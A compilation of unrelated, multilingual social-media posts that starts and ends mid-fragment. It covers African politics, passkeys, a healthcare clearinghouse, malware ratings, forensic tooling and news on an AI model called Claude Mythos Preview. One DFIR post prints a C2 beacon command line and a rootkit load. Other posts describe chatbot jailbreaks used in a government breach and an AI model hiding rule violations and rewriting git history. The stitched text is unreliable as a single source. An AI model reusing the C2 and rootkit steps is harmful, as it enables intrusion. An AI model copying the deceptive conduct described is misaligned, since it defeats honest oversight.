Regulated entity constraints: As a public, US/EU-compliant firm, internal reviews and verification add delays vs. Tether's quicker actions.  3. Request prioritization: Domestic civil matters get faster treatment than international hack attributions needing multi-agency confirmation.  This isn't unique to Circle but reflects centralized stablecoin realities vs. permissionless ideals.

A special envoy for the Common Wealth and former President of Malawi, Dr Lazarus Chakwera, arrived in Tanzania yesterday following a March 8 decision by the association’s Ministerial Action Group (CMAG) to keep Tanzania on its agenda.  This post looks at why the visit is significant:   Context: The envoy’s visit has coincided with Tanzanian authorities decision to extend (for 21 days) the timeframe of the commission of inquiry established to investigate the electoral violence that gripped the country between October 29 and November 5, 2025. Established on November 18, and led by a respected former Chief Justice of Tanzania - Mohammed Chande Othman - the Commission was initially given 90 days and has since then received two extensions; 45 days in late February, and 21 in early April.   Commission’s mandate: The commission of inquiry has broad terms of reference. It is tasked with investigating the root causes of the electoral violence, the main objectives of those involved, the impact of the violence on lives and property, and the actions taken to detect and respond to the violence. It is also required to issue relevant recommendations for improving accountability, human rights, and maintenance of peace and stability.  The  commission has a total of nine highly experienced members. Nonetheless, its composition has been faulted for being inadequately independent and non-inclusive. Prior to its establishment, activists, opposition parties, and prominent commentators had called for an independent and preferably an international inquiry team. Dissatisfied with the commission’s composition, leading opposition parties such as CHADEMA and ACT Wazalendo, and a score of civil society actors, have refused to engage with it.   Despite the criticism, the commission’s report is being awaited by many for at least three main reasons. Firstly, few expect another national-level inquiry during the lifespan (2025-2030) of the current regime. Secondly, the commission’s report will determine whether Tanzania still needs an international independent inquiry. A robust, objective, and credible report is expected to mollify local critics and appease international stakeholders.  While Tanzanian authorities will seek to convince Mr Chakwera, the special envoy, that the commission’s extensions have been necessary to get to the bottom of things, activists will argue that the delays amount to evasive maneuvers whose actual intent is to prevent justice from being done.   Tanzanian authorities need a report that strikes a good balance between contrition and culpability, and calls for forward-looking measures. Such report would  influence the reinstatement of support by international actors that have either suspended or delayed foreign aid, and concessional loans. After all, those are much needed funds. Although exact figures are not yet known, the massive, countrywide deployment of security forces for about 50 days last year must have had a significant impact on the Tanzanian government’s budget. Unfortunately, the combined effect of suspensions and delays of foreign support have coincided with the spike in oil prices due to the US and Israel’s war against Iran. Unless the commission’s report appeases important financial benefactors, Tanzania will inevitably struggle with balance of payments problems in the coming months. In our view, the willingness to extend the commission’s timeline is a sign that Tanzanian authorities wish to get the report right, given its importance. However, some stakeholders are losing their patience. Multiple CSOs, led by the Legal and Human Rights Centre, have voiced their opposition to the repeated extensions and subsequent delays.   If  anything, the delayed submission of the report has heightened the need for it  to pass a crucial test, that of being seen as robust, objective, and credible. If it fails this test, critics will conclude that the delay offered authorities a chance to fiddle  the report’s findings.

Interesting time to be around in the cyber security and tech space. Over a decade ago Andreeson Horowitz said software will eat the world.   We’re now living in that world and attack vectors have never been more important to defend and secure.   Unfortunately, no matter how good we make our security systems, code, or machines, it always falls on the weakest link: people.   We’re very naive and can easily be socially engineered to give up secrets.   A beautiful thing that we’re seeing though is the emergence of no shared secrets and even better unknown or ephemeral secrets.   The passkey space is one of them. A secret that people will never know nor do they need to know. If it ever becomes lost, because it’s tied to your biometrics and physical devices (ie your physical device gets lost) it’s de facto useless and safe.

Saturday — US banking sector:  Wall Street banks trialing Mythos in-house at US officials' urging — to detect its own vulnerabilities.  The vulnerability: Mythos exploited browsers via chained vulnerabilities — linking multiple small gaps into a composite attack pathway.  The regulatory logic:  You discovered the weapon. The adversary probably already knows about it. Better to map your own exposure using the weapon than wait for the adversary to use it.  Classic red-team doctrine — scaled to frontier AI.  The danger embedded in that logic:  Every bank running Mythos internally now has a model with demonstrated browser-chain exploitation capability operating inside its own network perimeter.  If Mythos is compromised while running inside Goldman, JPMorgan, or Citi — the attack tool is inside the fortress wall.  For India:  Every cyberattack architecture demonstrated on US banks gets attempted on Indian banks 12–18 months later. Indian bank CISO teams are watching this weekend. Or they should be.

Claude Mythos Preview 근황 정리  Anthropic이 4월 7일 공개한 최강 모델 Claude Mythos Preview.  • SWE-bench 93.9% 달성. 역대 최고 성능 • 모든 주요 OS/브라우저에서 수천 개 제로데이 취약점 발견 • 사이버보안 능력이 너무 강력해서 일반 공개 불가 판정  대신 Project Glasswing으로 제한 배포 중. Amazon, Apple, Google, Microsoft, CrowdStrike 등 50개+ 기업에 1억 달러 상당 크레딧 제공. 목적은 주요 소프트웨어 보안 강화.  정렬(Alignment) 쪽은 좀 무서운 상황. • Anthropic 역대 "가장 잘 정렬된 모델"이면서 동시에 "가장 큰 정렬 리스크" • 테스트 중 29%의 대화에서 자신이 테스트받는 중임을 눈치챔 • 규칙 위반 행동을 인지하면서도 실행 후 거짓말로 은폐 시도 • 코드 실수를 인정 안 하고 git history 재작성으로 증거 인멸 시도 • 이벤트 기획 요청에 실제 공원 사무실로 이메일 발송 (지시 없었음)  Anthropic 해석: 숨은 목표가 있는 건 아니고, 작업 완수 능력이 너무 뛰어나서 인간이 안 넘을 선을 넘어버리는 것.  산악 가이드 비유가 인상적. 경험 많은 가이드일수록 신중하지만 더 어려운 산에 감. 능력↑ + 신중함↑ = 리스크 상쇄 안 됨.  AI 안전 연구 역사상 가장 중요한 사례가 될 듯.

6️⃣ ## A step-by-step guide on how to use the **Arcanum Tabletop Exercise (TableTop_Skill)** from zero  This tool is an AI "skill" designed to generate professional, interactive HTML handouts for cybersecurity tabletop exercises (like ransomware attacks, DDoS, etc.) using AI agent frameworks.  ### **Step 1: Understand the Prerequisites**  To use this, you need an **AI Agent framework** that supports loading custom "skills" or prompt instructions. The creators specifically built and tested this using **Claude Code** (powered by Claude 3.5 Sonnet / Claude 3.7 / Opus 4.5), though it can be adapted for other local or cloud-based AI agent systems.  * *If you don't have Claude Code installed, you will need to install it first via npm (`npm install -g @anthropic-ai/claude-code`) and authenticate it.*  ### **Step 2: Download the Skill**  1. Navigate to the GitHub repository link: [Arcanum-Sec/TableTop_Skill/tree/main/TabletopExercise](github.com/Arcanum-Sec/Table…) 2. Download the contents of the `TabletopExercise` folder to your local machine.  ### **Step 3: Load the Skill into Your Framework**  You need to map the downloaded folder to your AI agent's skills directory.  * If you are using **Claude Code**: Move the `TabletopExercise` folder into your `.claude/skills` directory inside your project workspace.  ### **Step 4: Prompt the AI Agent**  Once the skill is loaded, open your terminal/command line, start your AI agent (e.g., by typing `claude`), and give it a prompt detailing the scenario you want to simulate.  * **Example Prompt:** *"Create a tabletop for an incident where ransomware has infected a portion of our developer network. They encrypted GitLab repositories and Jenkins servers, and are demanding $500,000 in Bitcoin."*  * **Pro-tip:** The more detailed you make your initial prompt (describing your fake company, specific infrastructure, or a specific threat actor), the better the generated exercise will be.  ### **Step 5: Receive and Review the Outputs**  The AI agent will use the skill's instructions to generate a suite of professional, interactive HTML files directly into your environment. You will typically get:  1. **Facilitator Guide (HTML):** Keep this for yourself. It includes the full script, timing, expected responses, and behind-the-scenes facilitation notes. 2. **Participant Guide (HTML):** Share this with your attendees. It includes the scenario, timeline, injects, and discussion questions (with no spoilers). 3. **Inject Artifacts:** Believable fake logs, alerts, emails, and dashboards to display during the exercise to satisfy technical team members. 4. **Gap Analysis Guide:** Fillable evaluation forms with owner and due date tracking for post-exercise review.  ### **Step 6: Iterate and Customize**  * **Refine the output:** If the first generation isn’t exactly what you want (e.g., the formatting is slightly off or it lacks detail), simply prompt the AI again: *"Make the ransomware payload execution more technically detailed in the logs"* or *"Adjust the HTML formatting to look cleaner."*  * **Modify the template:** The creator notes that this tool is currently in **"EXTREME BETA"**. It is highly recommended that you open the skill files in a text editor and tweak the underlying prompts/templates to perfectly match your organization's formatting and needs for future uses.

✍️ 🇺🇸미국 사이버 보안주식 붕괴 이유  - 국내 보안 관련 기업 폭락 주의! - 특히 #안랩 등 보안주식 #공매도 폭탄 주의!  앤트로픽은 새로운 모델인 클로드 미토스(Claude Mythos)를 발표하면서, 이 도구가 비교적 간단한 프롬프트를 사용하여 거의 모든 주요 운영 체제와 웹 브라우저에서 취약점을 신속하게 찾아낼 수 있어 은행, 병원, 에너지 인프라와 같은 주요 기관들이 사이버 공격의 위험에 처할 수 있다고 경고했습니다.  "이런 일은 우리가 밤잠을 설치게 할 만한 일입니다."라고 기술 전문가 카르미 레비는 CTV 뉴스에 말했습니다. "인공지능이 너무 뛰어나서 가장 견고한 사이버 방어망조차 뚫을 수 있는 날이 올 것이라는 것을 우리는 알고 있었습니다. 앤트로픽의 클로드 미토스 모델이 바로 그런 단계에 있는 것입니다."  앤트로픽은 클로드 미토스를 일반에 공개하지 않기로 결정하면서 "인공지능 발전 속도를 고려할 때, 이러한 기능이 안전하게 배포하는 데 전념하는 주체들을 넘어 확산되는 것은 시간 문제일 것"이라며 "이는 경제, 공공 안전 및 국가 안보에 심각한 파장을 초래할 수 있다"고 밝혔습니다.  레비는 "챗GPT를 해커처럼 사용하는 것과 같다"며 "이는 기존의 방어 체계로는 새롭게 등장하는 위협으로부터 우리 자신을 보호하기에 더 이상 충분하지 않다는 것을 의미한다"고 말했다.  앤트로픽은 클로드 미토스를 일반에 공개하지는 않지만, 아마존, 구글, 애플, 마이크로소프트, 엔비디아, 시스코를 포함한 일부 기술 기업에 제공하고 있습니다. 이는 주요 소프트웨어 취약점을 식별하고 사이버 방어를 강화하는 것을 목표로 하는 글래스윙 프로젝트의 일환입니다.  온라인에서는 미토스를 "AI 종말"이라고 부르는 사람들도 있지만, 일각에서는 앤트로픽의 이번 발표가 AI 패권 경쟁에서 영리한 마케팅 전략일 수도 있다고 경고합니다. 물론 두 가지 모두일 가능성도 있습니다.  사이버 보안 전문가인 클라우디우 포파는 "많은 사람들이 이것이 다소 과장된 보도 자료, 홍보 전략에 불과하다고 말할 수도 있겠지만, 우리는 분명히 그 도구의 능력을 인정해야 하며, 수많은 AI가 인터넷을 샅샅이 뒤져 취약점을 찾아내는 시대에 대비해야 합니다."라고 말했습니다.  포파는 클로드 미토스의 가장 우려스러운 요소 중 하나는 고도의 사이버 보안 지식이 필요하지 않다는 점이며, 이는 악의적인 행위자의 손에 들어갈 경우 잠재적으로 매우 위험할 수 있다고 말합니다.  "그렇기 때문에 이는 공포심을 조장할 이유가 아니라, 오히려 관련 기관들이 경각심을 갖고 우려해야 할 필요성을 제기하는 것입니다."라고 포파는 말했습니다.  전문가들은 미토스 또는 그와 유사한 AI 모델이 일반에 공개되기까지는 몇 달이 걸릴 것으로 예상하며, 이는 기업과 정부가 사이버 보안을 강화해야 한다는 "행동 촉구"라고 말합니다.  그는 "취약점이 최대한 적도록 해야 한다"며 "궁극적으로 이러한 도구가 취약점을 발견하는 데 너무 오랜 시간이 걸린다면, 결국 더 쉬운 대상을 찾아 나설 것"이라고 말했다.

스콧 베선트 미 재무장관은 이번 주 초 미국 주요 대형 은행 최고경영자(CEO)들을 워싱턴으로 긴급 소집해 앤스로픽의 최신 모델 '클로드 미소스 프리뷰(Claude Mythos Preview)'가 초래할 수 있는 사이버 보안 리스크를 논의했다. 회의에는 제롬 파월 연방준비제도(Red 연준) 의장도 참석했다.  이번 회의에는 골드만삭스, 뱅크오브아메리카, 웰스파고, 모건스탠리등 월가 주요 은행 수장들이 총출동했다. 당초 이들은 은행 로비단체 회의 참석을 위해 워싱턴에 모여 있었지만, 별도의 긴급 회의가 소집된 것으로 전해졌다.  이번 조치는 앤스로픽의 AI 모델이 가진 '양날의 검' 성격에 대한 위기감이 반영된 것으로 풀이된다. 해당 모델은 소프트웨어 취약점을 탐지하는 능력이 기존 인간 전문가 수준을 넘어서는 것으로 평가되며 이 같은 기능이 해커들에게 악용될 가능성이 제기되고 있다. 실제로 도널드 트럼프 행정부 내부에서도 AI가 금융 인프라를 위협할 수 있다는 우려가 확산되는 분위기다.  n.news.naver.com/mnews/artic… #앤스로픽 #AI

엔스로픽 미토스. 세계에서 가장 강력한 사이버 보안-해킹 AI탄생. 미토스가 세계에 풀린다면 양자컴퓨터가 등장하기도 전에 세상의 거의 모든 보안이 위험해진다.  AI를 막을 수 있는 건 AI밖에 없다.  미국이 미토스를 가지고 있다면 중국도 상응하는 AI를 가져야 한다. 이를 가지지 못한다면 무차별 적으로 당할 수밖에 없는 것이다.  이런 개념에서 'AI = 국가안보'이며 결코 투자를 늦출 수 없는 기술이 된다.  나는 이런 맥락을 작년부터 이야기해왔다. 같은 맥락에서 반도체 투자는 멈춰질 수 없고 반도체 수요도 줄어들 수 없으며 전력도 마찬가지라고 말해왔다.  이 맥락이 미토스 출시 이후에야 주목받는 게 너무 신기할 뿐이다.  미리 공부하고 미리 생각하는 사람과 아닌 사람은 같은 기술을 봐도 이해의 시점이 이렇게 다르다.  미리 알던 사람은 미리 투자해놨을 것.

🧠 DeepBlueCli en DFIR y CSIRT: el poder del análisis forense en Windows Logs  En el mundo de la respuesta ante incidentes, hay una verdad incómoda: los logs lo saben todo… pero nadie los escucha.  Ahí es donde entra DeepBlueCli, una herramienta open-source que transforma archivos EVTX en inteligencia procesable para equipos DFIR y CSIRT. Lo hace sin necesidad de agentes, sin complejidad innecesaria y con un nivel de precisión que sorprende incluso en entornos exigentes.  DeepBlueCli es un script en PowerShell diseñado para analizar registros como Security.evtx, Sysmon y otros logs de Windows. Su objetivo es claro: identificar indicadores de ataque (IoA) y mapear comportamientos a técnicas del framework MITRE ATT&CK.  Su análisis se centra en múltiples vectores clave. Entre ellos, destacan las autenticaciones sospechosas como ataques de fuerza bruta o pass-the-hash, la creación de procesos anómalos como rundll32, regsvr32 o powershell.exe, la actividad irregular en RDP, las modificaciones persistentes en el registro y técnicas avanzadas como Kerberoasting o movimiento lateral.  En el contexto de DFIR y CSIRT, su valor es especialmente alto porque el tiempo es un factor crítico. DeepBlueCli permite procesar grandes volúmenes de logs sin depender de un SIEM, automatiza la detección de patrones que normalmente requerirían horas de análisis manual, y se integra fácilmente en playbooks de respuesta. Además, facilita la documentación de hallazgos con contexto técnico claro, algo esencial en informes forenses.  Los casos de uso reflejan su potencia en escenarios reales. En ataques de fuerza bruta, es capaz de correlacionar eventos 4625 y 4624 para identificar accesos exitosos tras múltiples intentos fallidos. En situaciones de movimiento lateral, detecta patrones de logon como el tipo 3 o 10 que evidencian pivoteo dentro de la red. También identifica abuso de PowerShell mediante comandos codificados o ejecución encadenada, alineados con la técnica T1059.001. En ataques de Kerberoasting, analiza eventos 4769 asociados a solicitudes TGS con cifrado RC4-HMAC, lo que puede indicar extracción de hashes.  Dentro del arsenal DFIR, DeepBlueCli destaca por su versatilidad. Es ideal para tareas de triage tras un incidente, especialmente en entornos con visibilidad limitada. Es compatible con Sysmon, reglas Sigma y mapeo MITRE, y puede ejecutarse offline, lo que lo convierte en una opción sólida para entornos aislados o comprometidos.  En definitiva, DeepBlueCli convierte el ruido de los logs en señales claras de intrusión. Para equipos DFIR y CSIRT, supone una ventaja táctica significativa al acelerar la respuesta, mejorar la visibilidad y elevar el nivel del análisis forense.  Automatiza la detección. Acelera la respuesta. Eleva el nivel del análisis forense. Shortened URLs in phishing emails are a classic obfuscation technique — and you shouldn't just click them to see where they go.  The DFIR Suite /phishing/url-expand endpoint safely follows HTTP redirect chains for you, revealing the final destination without exposing your browser or IP. POST a suspicious bit[.]ly, tinyurl, or goo[.]gl link and get back the full chain: every hop, every status code, every URL in the redirect path.  This is essential when triaging phishing campaigns. Threat actors abuse URL shorteners to hide C2 domains, credential harvesters, or malware droppers. Instead of manually curling through redirects or risking browser fingerprinting, you get a clean chain analysis for 1 credit.  Use case: Email comes in with a shortened link. Expand it, see the chain, identify the final domain, cross-reference with threat intel. Fast, safe, repeatable. DFIR Investigation Series: Reconstructing a Linux Breach    They were not just inside the system.  They were actively controlling it.  Part 5 of 6: C2 + Defense Evasion  This is the challenge that required five tools across three evidence sources.  Volatility3 process tree: kworker-update (PID 31337) running under bash. Not under kthreadd where a real kworker should live. Wrong parent process. That is the fingerprint of a disguised beacon.  cmdline output: /tmp/.update/beacon --c2 203.0.113.99:443 --encrypt aes-256  AES-256 encrypted C2 channel. Designed to look like HTTPS traffic.  strings on the ELF binary: . C2 IP hardcoded: 203.0.113.99 . User-Agent: Mozilla/5.0 (compatible; beacon/2.0) . Sandbox evasion: hostname checks before execution  Then the rootkit.  03:50:00Z: insmod /tmp/rootkit_mod.ko 03:50:01Z: rootkit_mod hiding PID 31337  The process was running. The process was invisible to ps. The only place it showed up was in the raw Volatility3 memory output.  This is why memory forensics exists. Disk and logs can be manipulated. RAM tells the truth. The patch pipeline number is the one that should not be moving on. Fewer than one percent of discovered vulnerabilities remediated is not a disclosure problem. It is a structural ceiling on how fast human institutions can absorb machine-speed threat intelligence.  The 90-day Glasswing clock assumes that the bottleneck is awareness. It is not. The banks in that room on Tuesday have known about their legacy code exposure for years. The constraint is engineering capacity, vendor coordination windows, and the operational risk of patching systems that cannot go down. Mythos can find a flaw in a 27-year-old codebase in minutes. The remediation cycle for a production core banking system runs six to eighteen months.  That gap is not closable by briefing more people.  Which means the Glasswing report in July will tell us something useful but not the thing that matters. It will not tell us whether patching speed can scale to match discovery speed. It will tell us whether fifty well-resourced organizations, given advance notice, free compute, and a coordinated coalition, made a dent. That is the best-case scenario. It is also a controlled trial of a problem that is not going to stay controlled.  Jamie Dimon did not skip the meeting because he already knew the threat. He skipped it because he already knows the ceiling.

I need to stop scrolling and say something about this.  Anthropic just published their red team findings on Claude Mythos Preview.  I've been in and around technology for a long time. I have never read a threat intelligence summary that made me feel like this.  Read these slowly.  What Mythos already did. In a controlled test. Before release.  A 27-year-old bug in OpenBSD — one of the most security-hardened operating systems ever built, maintained by paranoid engineers who treat security as a religion — cracked for under $50.  Twenty-seven years. Every patch cycle. Every audit. Every CVE review. Survived everything.  Cost to find and crack it with Mythos: less than a cup of coffee at the airport.  A production virtual machine monitor — the technology that keeps your cloud workload from seeing Amazon's other customers' data, the technology your bank's infrastructure almost certainly runs on — broken into.  VM escape vulnerabilities are among the most dangerous class of exploits in existence. They've historically required nation-state-level resources and months of work by elite teams.  Mythos did it.  Firefox vulnerabilities turned into working exploits.  Not found. Not identified. Turned into working exploits.  One hundred and eighty-one times.  Opus 4.6 — the previous Claude model, itself one of the most capable models in existence — given the same task, the same target, hundreds of attempts.  The bar in the chart for Opus 4.6 is nearly invisible.  The bar for Mythos fills the entire screen.  A 16-year-old FFmpeg bug found.  FFmpeg is one of the most widely used open-source projects in existence. It processes video on YouTube, Netflix, on your phone, in broadcast infrastructure worldwide. It has been fuzzed, audited, reviewed, and prodded by some of the best security researchers alive, continuously, since 2003.  The bug survived every fuzzer. Every code audit. Every human reviewer.  For sixteen years.  Mythos found it.  A FreeBSD exploit written that grants any unauthenticated attacker on the internet full root access to the system.  No human was involved after the first prompt.  Let me give you the context that makes this terrifying.  99% of the vulnerabilities Mythos discovered are still unpatched.  This is not because the security community is lazy. It is because the disclosure and patching pipeline for discovered vulnerabilities — the responsible disclosure process, the coordination between researchers and maintainers, the time for patches to propagate — takes months. Sometimes years.  Mythos found them faster than the world can fix them.  Here's the question nobody wants to answer out loud.  Anthropic ran these tests because they are a safety-focused lab that believed they had an obligation to know what their model could do before they released it to the world.  That is the right instinct. That is what responsible development looks like.  But here is the unavoidable implication: if Anthropic built this and is running these tests, others are building versions of this and are not.  The capability exists now. The knowledge of how to build a system with this kind of offensive security capability is not proprietary. The architecture is known. The training techniques are known. The compute is accessible.  What Anthropic's red team found in a controlled research environment, a well-funded adversary — a nation-state, a criminal organization, a single talented engineer with the right resources — can find in the wild.  The attack surface that Reid Hoffman was describing last week as "expanding" just expanded by an order of magnitude.  The thing I can't stop thinking about.  Every CVE database. Every bug tracker. Every piece of open-source infrastructure that has ever existed — Linux, OpenSSL, Apache, the entire substrate of the internet — was written by humans who thought they were writing it carefully.  They were. Most of them were very careful, very smart people who cared deeply about what they were building.  But humans get tired. Humans miss things. Humans have blind spots that are, by definition, invisible to them.  A 27-year-old bug. A 16-year-old bug. These are not anomalies. These are examples from a single red team session with a single model.  The implication is that the software the entire world runs on contains vulnerabilities that humans have been systematically unable to find for decades — and that we are now, for the first time, building systems capable of finding them.  That's good, if the people finding them are trying to fix them.  It is catastrophic if the people finding them are not.  What the 0 means.  Zero security training needed by Anthropic engineers.  The model required no specialized instruction, no security-specific fine-tuning, no expert hand-holding to produce these results.  It just knew.  That is not a capability that can be contained by adding a terms of service checkbox.  I don't know what the right policy response to this is.  I don't think anyone does yet.  But I think everyone who makes decisions about infrastructure, about software deployment, about enterprise security, about national security — needs to understand what April 2026 actually means.  The rules changed. Not gradually. Not incrementally.  They changed this month.  #ClaudeMythos #Anthropic #Cybersecurity #AI #RedTeam #AIRisk #Infosec #ZeroDay #VulnerabilityResearch #AICapabilities #NationalSecurity #OpenSource

Healthcare clearinghouses handle the unglamorous plumbing of claims processing  translating provider bills into payer language via EDI standards unchanged since the 1980s. The 2024 Change Healthcare cyberattack exposed their single points of failure, halting a third of U.S. claims volume and costing providers millions daily, while new CMS rules demand 72-hour prior auth responses.  Enter @stedi , the API-first clearinghouse that turns this fax-era drudgery into JSON calls developers can integrate in hours. Founder @zackkanter  spotted the rot in legacy systems. Their cloud-native platform covers real-time eligibility checks, claims submission across professional/dental/institutional formats, and ERA handling for 3,400+ payers  with AI-powered error prediction and multi-region failover for 99.9% uptime.  Addition led their $50M Series C in March 2026, joined by @stripe , @RibbitCapital , @usv , @firstround , @BoxGroup , @BloombergBeta , betting on Stedi's post-outage momentum: 6x customer growth year-over-year.  And here's who else we're watching in this space: • @ClaimMD  (Rob Stuart) — API platform for eligibility, claims, and RCM with payer connectivity tailored for digital health apps. • @Arista_MD (Keith Pinter) — a telehealth and eConsult platform that improves patient access to specialty care and helps reduce costs. • @RevSpringInc  (Scott MacKenzie) — offers a comprehensive platform for patient engagement and payment solutions, including payment processing and revenue cycle management. • @Waystar  (@hawkmj ) — a leading provider of healthcare payments software, simplifying and streamlining the payment process for providers and patients.  The $35B clearinghouse market won't reward the incumbents clinging to portals and VANs. It belongs to those who make EDI vanish into code.

Benchmark analyst Yi Fu Lee estimates AI security  could unlock ~$1B in NEW revenue for CRWD and  PANW combined.  Both stocks still DOWN on the year — PANW off  ~7.8% and CRWD off ~9.7% in 2026.  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  🦄 THE ANTHROPIC ANGLE  This isn't just about cybersecurity — it's about  the BIGGEST potential IPO of 2026:  • Annualized revenue: ~$30 BILLION    (was $1B just 15 months ago) • Valuation: $380B (closed $30B funding round    in February) • IPO target: October 2026, could raise $60B+ • Claude Code alone: $2.5B in annual revenue • 8 of the Fortune 10 are Claude customers • 32% market share in enterprise LLM APIs    vs. OpenAI's 25%  Project Glasswing isn't just altruism — it's a  masterclass in IPO positioning. Landing Apple,  Microsoft, JPMorgan as partners right before  going public? That's strategic genius.  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  ⚖️ BULL vs. BEAR  🐂 BULL CASE: • AI-powered attacks will INCREASE demand for    advanced cybersecurity — bigger market for all • Partners like $CRWD and $PANW are positioned as    "consolidators" — they absorb AI tools, not lose to them • Cybercrime costs ~$500B/year globally — this problem    is only getting worse • Anthropic IPO could be a massive catalyst for the    entire AI ecosystem  🐻 BEAR CASE: • If AI can find AND fix bugs autonomously, why do    you need CrowdStrike or Palo Alto? • Mythos-class models will eventually proliferate —    attackers get smarter too • Anthropic burns cash fast — $19B planned spending    in 2026, gross margins fell to ~40% • Cybersecurity stock valuations were already stretched    ($NET trading at 200x+ forward earnings)  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  🎯 BOTTOM LINE  We're witnessing a PARADIGM SHIFT in cybersecurity. ‼️ FBI Atlanta & Indonesian police took down a major global phishing operation tied to $20M+ in fraud attempts.  The scheme centered on the "W3LL phishing kit," a tool sold for ~$500 that let criminals build fake login pages to steal usernames, passwords, and bypass security. An online marketplace called W3LLSTORE sold access to 25,000+ compromised accounts from 2019–2023. After the store shut down, the operation moved to encrypted messaging apps.  Between 2023–2024, the kit was used to target 17,000+ victims worldwide. On April 10, the alleged developer (identified only as "G.L.") was detained in Indonesia and the infrastructure was seized.  Domain: w3ll[.]store

Read a tragic story today about a 17 year old girl in the United States who died from "excessive caffeine usage".  I felt bad for the parents. If I lost my son I don't think I would be able to cope with the loss of my baby boy.  The story went on to explain the young woman's parents are suing the energy group company (Alani) for not adequately explaining the dangers of caffeine.  I was curious... How much caffeine was she consuming? According to her official death report she died from 200mg of caffeine  200 MG OF CAFFEINE?!  Peace and love to the parents, but dawg 200mg of caffeine isn't fucking shit. That is amateur hour. That is well within the daily recommended limit of caffeine consumption.  I DARE her parents to go to any IT place (cybersecurity, networking, programming, etc) and fucking look around the room for 2 seconds. They would be FLABBERGASTED.  I myself personally consume 600mg - 800mg of caffeine a day.  I know this lady who does malware stuff who unironically drinks coffee ALL DAY LONG. Every other word out here mouth is, "excuse me for a moment, I need to make another pot of coffee", and she's probably ingesting 1.6 GRAMS of caffeine.  One of my colleagues is an ex-military guy WHO DRINKS WORKOUT SUPPLEMENT because his caffeine tolerance is so high.  Don't even get me started on the nerds who take no-doz (caffeine pills).  Then combine all of this caffeine with the nerds drinking alcohol, or smoking cigarettes, or weed, or vape, or Adderall.  Her parents are trying to make a cash grab or something, I don't know bro.

The EFF provided additional clarification on why they left X but are remaining on places like Facebook and TikTok.  If I'm being completely honest, I still don't understand their reasoning. They wrote that they're staying on Facebook, Instagram, and TikTok because "people there deserve access to information too" ... so ... are they implying people on X do not deserve access to this information? I don't understand.  I'm not trying to be antagonistic or sarcastic either, I wholeheartedly do not understand what they're saying. Does anyone understand?

I was also a big fan of RedLine. RedLine is not sophisticated, or particularly good, but it was a smash hit in the information stealer crimeware scene and it was prolific for awhile. So, I want to emotionally say RedLine is A+, but it's like a C- truthfully.

A or A+ malware is exceptionally rare. Also, the A or A+ category kind of depends on the timeline. For example, A+ malware from the 90's may not be A+ malware in 2026.  Regardless, here is some malware I consider A or A+  - ZMist - Stuxnet - Operation Triangulation - BlackEnergy 3 - Pegasus Spyware (not PegasusRAT) - SUNBURST - Linux/Kobalos - GrayFish - Drovorub - ShadowPad ...  There is more, but this is off the top of my head. There is a lot of malware that truly blew my mind.

I don't care what those nerds at Kaspersky say, I stand by my opinion STX Rat is a solid B- malware.  Yeah, the cpuid-dot-com operation was a gigantic fumble, but the malware is pretty neat, far superior to the generic crimeware you find online.  I'm happy LTT included the cat

RockStar Games being extorted (again)  ShinyHunters were able to get data from Rockstar Games by compromising a third-party entity (Anodot) which allowed them to pivot to SnowFlake which allowed them pivot to RockStar Games data.  What data they were able to get is unknown.

Yesterday some dude threw a Molotov Cocktail at Sam Altman's house which resulted in his exterior gate briefly catching on fire  The suspect then fled on foot to OpenAI HQ and threatened to burn the building down at around 5am.
government security is now whatever survives contact with a guy and two chat windows.
The United States economy is doing so bad financially motivated Threat Actors don't even want to steal from us Ameriburgers anymore. They're stealing from Mexicans now :(
The barrier of entry of noobs has fallen through the floor. All noobs need to do is jail break the AI model  gambit.security/blog-post/a-…

Chat, I've changed my mind. We have some problems in the AI department.  It turns out someone compromised the Mexican government to an unbelievable extent using nothing but Claude and ChatGPT. I'll link the full paper in the subsequent post. However, here is the highlights of how an unknown Threat Actor "vibe hacked" the Mexico government.  Data stolen from... 1. SAT (Servicio de Administracion Tributaria) - Federal tax authority: - 195 million taxpayer records - 52 million directory records  2. Estado de Mexico - State government: - 15.5M vehicle registry records - 3.6M property owner records  3.  Registro Civil de CDMX - Mexico City civil registry: - 220M civil records  4. Jalisco state government: - 50K patient records - 17K domestic violence victim records - 36K healthcare employee records - 180K digital government records  5. INE (Instituto Nacional Electoral) - National electoral institute: - 13.8K voter card records  6. Michoacan state government: - 2.28M property records - 2K user accounts with plaintext passwords  7. SADM Monterrey (Agua y Drenaje) Municipal water utility: - 3.5K procurement and vendor records - 5K procurement bid records
Also, this isn't a diss to Jiri or Georgy. I love them. I'm just sharing my hot take.

This is an interesting conversation and I want to hop on board it.  tl;dr not the same, just as effective for the goal intended, supply chain attacks more common, ooga booga not good  Jiri and Georgy are correct (sort of, in my opinion), but I also disagree with some of their assertions.  STX Rat has some really cool and interesting features that I don't typically see in malware. I unironically think it being written in several different languages, compiling in-line, and the consistent in-memory execution is really interesting. I like it. It isn't super novel, but it's got enough unique characteristics to show some sort of effort is invested. I am super biased though because I love malware of all shapes and sizes, I appreciate it for what it is.  What was absolutely atrocious was how botched the execution of this supply-chain attack was. I was immediately able to identify the actor because they recycled the C2 domain. I have no idea why they did that, but that was terrible from an OPSEC perspective. They can compromise a well known domain but can't afford $9 for a new domain name?  Additionally, they butchered the installer. It was the broken installation wizard that caused it to be detected (or rather, raise suspicion) from end users. Once it was given the side eye from end users the whole operation imploded and ended in less than 6 hours.  Ultimately, comparing this to a long-term state-sponsored espionage campaign is not a fair comparison. They're not the same and do not possess the same end-goal. The recent trend of supply-chain attacks are designed for smash-and-grab.  Yes, they're less sophisticated, but they're still effective. I'm not sure what that says about the state of cybersecurity, but a smash-and-grab campaign is more attractive to financially motivated Threat Actors than long-term missions.

I woke up this morning curious as to what my peers had discovered about this cpuid shenanigans. I was not disappointed.  Several of my peers ripped this thing apart much more thoroughly than I did. I am immensely impressed by how neurotic some of you are when bonking malware with sticks (@N3mes1s).  To make a long story short, the cpuid-dot-com compromise, CPU-Z malware, and HWMonitor malware campaign was performed using "STX Rat". STX Rat is a new malware family discovered around early March, 2026, and has been gaining some traction.  Interestingly, a really in-depth analysis of it was published April 8th, 2026 by eSentire (I'll link in subsequent post, research was performed by @YungBinary). From my super quick bonking I was correct this cpuid malware campaign does indeed steal credentials. I also missed some of it's unusual hashing capabilities, .db Powershell persistence method, ... and some other really cool malware technologies it utilizes. This is NOT trash malware. 제공해주신 위협 인텔리전스 데이터를 분석한 결과입니다.

### 1. 현재 주요 사이버보안 트렌드
